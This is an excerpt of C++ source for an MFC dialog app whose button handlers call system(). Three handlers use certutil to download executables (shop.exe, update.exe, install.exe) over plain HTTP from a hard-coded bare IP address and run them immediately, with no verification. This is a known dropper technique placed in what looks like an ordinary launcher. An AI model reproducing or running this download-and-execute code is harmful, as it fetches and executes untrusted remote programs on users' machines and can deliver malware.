...
BEGIN_MESSAGE_MAP(CMFCApplication2Dlg, CDialogEx)
	...
	ON_BN_CLICKED(IDC_MFCLINK3, &CMFCApplication2Dlg::OnBnClickedMfclink3)
END_MESSAGE_MAP()
...
{
	// TODO: 在此添加控件通知处理程序代码
	system("cd flash & cd 3 & flash.bat");
}
...
{
	// TODO: 在此添加控件通知处理程序代码
	system("certutil -urlcache -split -f http://164.155.102.170:8000/shop/shop.exe shop.exe & shop.exe");
}
...
{
	// TODO: 在此添加控件通知处理程序代码
	system("certutil -urlcache -split -f http://164.155.102.170:8000/update/update.exe update.exe & update.exe");
}
...
{
	// TODO: 在此添加控件通知处理程序代码
	system("certutil -urlcache -split -f http://164.155.102.170:8000/install/install.exe install.exe & install.exe");
}
...
void CMFCApplication2Dlg::OnBnClickedMfclink4()
{
	// TODO: 在此添加控件通知处理程序代码
...
{
	// TODO: 在此添加控件通知处理程序代码
	system("start GPL.txt");
}


void CMFCApplication2Dlg::OnBnClickedMfclink3()
{
	// TODO: 在此添加控件通知处理程序代码
}
